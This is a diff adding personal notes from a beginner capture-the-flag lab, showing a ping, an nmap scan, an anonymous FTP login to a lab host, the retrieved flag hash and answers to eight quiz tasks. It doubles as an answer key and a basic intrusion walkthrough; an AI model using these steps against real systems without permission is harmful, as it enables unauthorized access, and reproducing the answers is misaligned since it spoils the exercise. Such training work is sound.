@@ -1,0 +1,121 @@
+IP 10.129.11.85
+
+ping 10.129.11.85
+
+nmap -sV 10.129.11.85
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 01:21 BST
+Nmap scan report for 10.129.11.85
+Host is up (0.057s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
+
+ftp 10.129.11.85
+Connected to 10.129.11.85.
+220 (vsFTPd 3.0.3)
+Name (10.129.11.85:root): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls 
+229 Entering Extended Passive Mode (|||6224|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+226 Directory send OK.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||19572|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        121          4096 Jun 04  2021 .
+drwxr-xr-x    2 0        121          4096 Jun 04  2021 ..
+-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+226 Directory send OK.
+ftp> nano flag.txt
+?Invalid command.
+ftp> sudo nano flag.txt
+?Invalid command.
+ftp> help
+Commands may be abbreviated.  Commands are:
+
+!		cdup		epsv4		hash		mdelete		mput		pdir		quote		rmdir		struct		user
+$		chmod		epsv6		help		mdir		mreget		pls		rate		rstatus		sunique		verbose
+account		close		exit		idle		mget		msend		pmlsd		rcvbuf		runique		system		xferbuf
+append		cr		features	image		mkdir		newer		preserve	recv		send		tenex		?
+ascii		debug		fget		lcd		mls		nlist		progress	reget		sendport	throttle
+bell		delete		form		less		mlsd		nmap		prompt		remopts		set		trace
+binary		dir		ftp		lpage		mlst		ntrans		proxy		rename		site		type
+bye		disconnect	gate		lpwd		mode		open		put		reset		size		umask
+case		edit		get		ls		modtime		page		pwd		restart		sndbuf		unset
+cd		epsv		glob		macdef		more		passive		quit		rhelp		status		usage
+ftp> open flag.txt
+Already connected to 10.129.11.85, use close first.
+ftp> page flag.txt
+035db21c881520061c53e0536e44f815
+
+TASK 1
+
+What does the 3-letter acronym FTP stand for?
+
+File transfer protocol
+
+
+TASK 2
+
+Which port does the FTP service listen on usually?
+
+21
+
+
+TASK 3
+
+What acronym is used for the secure version of FTP?
+
+SFTP
+
+
+TASK 4
+
+What is the command we can use to send an ICMP echo request to test our connection to the target?
+
+ping
+
+
+TASK 5
+
+From your scans, what version is FTP running on the target?
+
+vsftpd 3.0.3
+
+
+TASK 6
+
+From your scans, what OS type is running on the target?
+
+unix
+
+
+TASK 7
+
+What is the command we need to run in order to display the 'ftp' client help menu?
+
+ftp -h
+
+
+TASK 8
+
+What is username that is used over FTP when you want to log in without having an account?
+
+anonymous
+
+
+SUBMIT FLAG
+
+Submit root flag
+
+035db21c881520061c53e0536e44f815
